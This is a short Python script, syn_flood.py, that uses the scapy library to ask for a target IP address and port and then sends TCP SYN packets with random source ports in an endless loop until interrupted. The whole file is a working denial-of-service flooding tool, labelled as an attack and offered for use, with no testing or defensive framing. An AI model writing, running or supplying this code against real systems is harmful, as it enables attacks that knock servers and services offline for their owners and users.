# syn_flood.py
from scapy.all import *

def syn_flood():
    target_ip = input("Enter target IP address: ")
    target_port = int(input("Enter target port: "))

    print(f"[+] Launching SYN flood on {target_ip}:{target_port}")
    try:
        while True:
            IP_Packet = IP(dst=target_ip)
            TCP_Packet = TCP(sport=RandShort(), dport=target_port, flags="S")
            send(IP_Packet/TCP_Packet, verbose=False)
    except KeyboardInterrupt:
        print("\n[+] SYN flood stopped.")
